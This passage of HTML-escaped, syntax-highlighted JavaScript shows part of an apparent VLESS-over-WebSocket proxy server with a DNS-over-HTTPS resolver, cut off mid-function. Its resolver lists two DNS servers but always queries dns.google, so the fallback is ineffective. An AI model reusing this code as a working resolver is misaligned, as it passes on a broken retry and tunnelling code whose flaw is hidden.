&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;  &lt;span class=&#34;o&#34;&gt;}&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;o&#34;&gt;}&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;const &lt;span class=&#34;nv&#34;&gt;tlsOptions&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; getTLSOptions&lt;span class=&#34;o&#34;&gt;()&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;const &lt;span class=&#34;nv&#34;&gt;httpServer&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; tlsOptions ? https.createServer&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;tlsOptions, requestHandler&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt; : http.createServer&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;requestHandler&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;const &lt;span class=&#34;nv&#34;&gt;wss&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; new WebSocket.Server&lt;span class=&#34;o&#34;&gt;({&lt;/span&gt; server: httpServer &lt;span class=&#34;o&#34;&gt;})&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;const &lt;span class=&#34;nv&#34;&gt;uuid&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; UUID.replace&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;/-/g, &lt;span class=&#34;s2&#34;&gt;&amp;#34;&amp;#34;&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;const &lt;span class=&#34;nv&#34;&gt;DNS_SERVERS&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;8.8.4.4&amp;#39;&lt;/span&gt;, &lt;span class=&#34;s1&#34;&gt;&amp;#39;1.1.1.1&amp;#39;&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;// Custom DNS
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;k&#34;&gt;function&lt;/span&gt; resolveHost&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;host&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;{&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;  &lt;span class=&#34;k&#34;&gt;return&lt;/span&gt; new Promise&lt;span class=&#34;o&#34;&gt;((&lt;/span&gt;resolve, reject&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&amp;gt; &lt;span class=&#34;o&#34;&gt;{&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &lt;span class=&#34;k&#34;&gt;if&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;/^&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;?:&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;?:25&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;0-5&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;2&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;0-4&lt;span class=&#34;o&#34;&gt;][&lt;/span&gt;0-9&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;01&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt;?&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;0-9&lt;span class=&#34;o&#34;&gt;][&lt;/span&gt;0-9&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt;?&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;se&#34;&gt;\.&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;){&lt;/span&gt;3&lt;span class=&#34;o&#34;&gt;}(&lt;/span&gt;?:25&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;0-5&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;2&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;0-4&lt;span class=&#34;o&#34;&gt;][&lt;/span&gt;0-9&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;01&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt;?&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;0-9&lt;span class=&#34;o&#34;&gt;][&lt;/span&gt;0-9&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt;?&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;$/.test&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;host&lt;span class=&#34;o&#34;&gt;))&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;{&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;      resolve&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;host&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;      &lt;span class=&#34;k&#34;&gt;return&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &lt;span class=&#34;o&#34;&gt;}&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &lt;span class=&#34;nb&#34;&gt;let&lt;/span&gt; &lt;span class=&#34;nv&#34;&gt;attempts&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; 0&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &lt;span class=&#34;k&#34;&gt;function&lt;/span&gt; tryNextDNS&lt;span class=&#34;o&#34;&gt;()&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;{&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;      &lt;span class=&#34;k&#34;&gt;if&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;attempts &amp;gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; DNS_SERVERS.length&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;{&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;        reject&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;new Error&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;sb&#34;&gt;`&lt;/span&gt;Failed to resolve &lt;span class=&#34;si&#34;&gt;${&lt;/span&gt;&lt;span class=&#34;nv&#34;&gt;host&lt;/span&gt;&lt;span class=&#34;si&#34;&gt;}&lt;/span&gt; with all DNS servers&lt;span class=&#34;sb&#34;&gt;`&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;))&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;        &lt;span class=&#34;k&#34;&gt;return&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;      &lt;span class=&#34;o&#34;&gt;}&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;      const &lt;span class=&#34;nv&#34;&gt;dnsServer&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; DNS_SERVERS&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;attempts&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;      attempts++&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;      const &lt;span class=&#34;nv&#34;&gt;dnsQuery&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;sb&#34;&gt;`&lt;/span&gt;https://dns.google/resolve?name&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;si&#34;&gt;${&lt;/span&gt;&lt;span class=&#34;nv&#34;&gt;encodeURIComponent&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(host)&lt;/span&gt;&lt;span class=&#34;si&#34;&gt;}&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;&amp;amp;&lt;/span&gt;&lt;span class=&#34;nv&#34;&gt;type&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;A&lt;span class=&#34;sb&#34;&gt;`&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;      axios.get&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;dnsQuery, &lt;span class=&#34;o&#34;&gt;{&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;        timeout: 5000,
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;        headers: &lt;span class=&#34;o&#34;&gt;{&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;          &lt;span class=&#34;s1&#34;&gt;&amp;#39;Accept&amp;#39;&lt;/span&gt;: &lt;span class=&#34;s1&#34;&gt;&amp;#39;application/dns-json&amp;#39;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;        &lt;span class=&#34;o&#34;&gt;}&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;      &lt;span class=&#34;o&#34;&gt;})&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;      .then&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;nv&#34;&gt;response&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&amp;gt; &lt;span class=&#34;o&#34;&gt;{&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;        const &lt;span class=&#34;nv&#34;&gt;data&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; response.data&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;        &lt;span class=&#34;k&#34;&gt;if&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;data.Status &lt;span class=&#34;o&#34;&gt;===&lt;/span&gt; &lt;span class=&#34;m&#34;&gt;0&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;&amp;amp;&amp;amp;&lt;/span&gt; data.Answer &lt;span class=&#34;o&#34;&gt;&amp;amp;&amp;amp;&lt;/span&gt; data.Answer.length &amp;gt; 0&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;{&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;          const &lt;span class=&#34;nv&#34;&gt;ip&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; data.Answer.find&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;nv&#34;&gt;record&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&amp;gt; record.type &lt;span class=&#34;o&#34;&gt;===&lt;/span&gt; 1&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;          &lt;span class=&#34;k&#34;&gt;if&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;ip&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;{&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;            resolve&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;ip.data&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;            &lt;span class=&#34;k&#34;&gt;return&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;          &lt;span class=&#34;o&#34;&gt;}&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;        &lt;span class=&#34;o&#34;&gt;}&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;        tryNextDNS&lt;span class=&#34;o&#34;&gt;()&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;      &lt;span class=&#34;o&#34;&gt;})&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;      .catch&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;nv&#34;&gt;error&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&amp;gt; &lt;span class=&#34;o&#34;&gt;{&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;        tryNextDNS&lt;span class=&#34;o&#34;&gt;()&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;      &lt;span class=&#34;o&#34;&gt;})&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &lt;span class=&#34;o&#34;&gt;}&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    tryNextDNS&lt;span class=&#34;o&#34;&gt;()&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;  &lt;span class=&#34;o&#34;&gt;})&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;o&#34;&gt;}&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;// VLE-SSå¤„ç†
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;k&#34;&gt;function&lt;/span&gt; handleVlessConnection&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;ws, msg&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;{&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;  const &lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;VERSION&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; msg&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;  const &lt;span class=&#34;nv&#34;&gt;id&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; msg.slice&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;1, 17&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;  &lt;span class=&#34;k&#34;&gt;if&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;!id.every&lt;span class=&#34;o&#34;&gt;((&lt;/span&gt;v, i&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&amp;gt; &lt;span class=&#34;nv&#34;&gt;v&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;==&lt;/span&gt; parseInt&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;uuid.substr&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;i * 2, 2&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;, 16&lt;span class=&#34;o&#34;&gt;)))&lt;/span&gt; &lt;span class=&#34;k&#34;&gt;return&lt;/span&gt; false&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;  &lt;span class=&#34;nb&#34;&gt;let&lt;/span&gt; &lt;span class=&#34;nv&#34;&gt;i&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; msg.slice&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;17, 18&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;.readUInt8&lt;span class=&#34;o&#34;&gt;()&lt;/span&gt; + 19&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;  const &lt;span class=&#34;nv&#34;&gt;port&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; msg.slice&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;i, &lt;span class=&#34;nv&#34;&gt;i&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;+=&lt;/span&gt; 2&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;.readUInt16BE&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;0&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;  const &lt;span class=&#34;nv&#34;&gt;ATYP&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; msg.slice&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;i, &lt;span class=&#34;nv&#34;&gt;i&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;+=&lt;/span&gt; 1&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;.readUInt8&lt;span class=&#34;o&#34;&gt;()&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;  const &lt;span class=&#34;nv&#34;&gt;host&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;nv&#34;&gt;ATYP&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;==&lt;/span&gt; &lt;span class=&#34;m&#34;&gt;1&lt;/span&gt; ? msg.slice&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;i, &lt;span class=&#34;nv&#34;&gt;i&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;+=&lt;/span&gt; 4&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;.join&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;.&amp;#39;&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt; :
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;nv&#34;&gt;ATYP&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;==&lt;/span&gt; &lt;span class=&#34;m&#34;&gt;2&lt;/span&gt; ? new TextDecoder&lt;span class=&#34;o&#34;&gt;()&lt;/span&gt;.decode&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;msg.slice&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;i + 1, &lt;span class=&#34;nv&#34;&gt;i&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;+=&lt;/span&gt; &lt;span class=&#34;m&#34;&gt;1&lt;/span&gt; + msg.slice&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;i, i + 1&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;.readUInt8&lt;span class=&#34;o&#34;&gt;()))&lt;/span&gt; :
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;nv&#34;&gt;ATYP&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;==&lt;/span&gt; &lt;span class=&#34;m&#34;&gt;3&lt;/span&gt; ? msg.slice&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;i, &lt;span class=&#34;nv&#34;&gt;i&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;+=&lt;/span&gt; 16&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;.reduce&lt;span class=&#34;o&#34;&gt;((&lt;/span&gt;s, b, i, a&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&amp;gt; &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;i % &lt;span class=&#34;m&#34;&gt;2&lt;/span&gt; ? s.concat&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;a.slice&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;i - 1, i + 1&lt;span class=&#34;o&#34;&gt;))&lt;/span&gt; : s&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;, &lt;span class=&#34;o&#34;&gt;[])&lt;/span&gt;.map&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;nv&#34;&gt;b&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&amp;gt; b.readUInt16BE&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;0&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;.toString&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;16&lt;span class=&#34;o&#34;&gt;))&lt;/span&gt;.join&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;:&amp;#39;&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt; : &lt;span class=&#34;s1&#34;&gt;&amp;#39;&amp;#39;&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;))&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;  ws.send&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;new Uint8Array&lt;span class=&#34;o&#34;&gt;([&lt;/span&gt;VERSION, 0&lt;span class=&#34;o&#34;&gt;]))&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;  const &lt;span class=&#34;nv&#34;&gt;duplex&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; createWebSocketStream&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;ws&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;  resolveHost&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;host&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    .then&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;nv&#34;&gt;resolvedIP&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&amp;gt; &lt;span class=&#34;o&#34;&gt;{&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;      net.connect&lt;span class=&#34;o&#34;&gt;({&lt;/span&gt; host: resolvedIP, port &lt;span class=&#34;o&#34;&gt;}&lt;/span&gt;, &lt;span class=&#34;k&#34;&gt;function&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;()&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;{&lt;/span&gt;
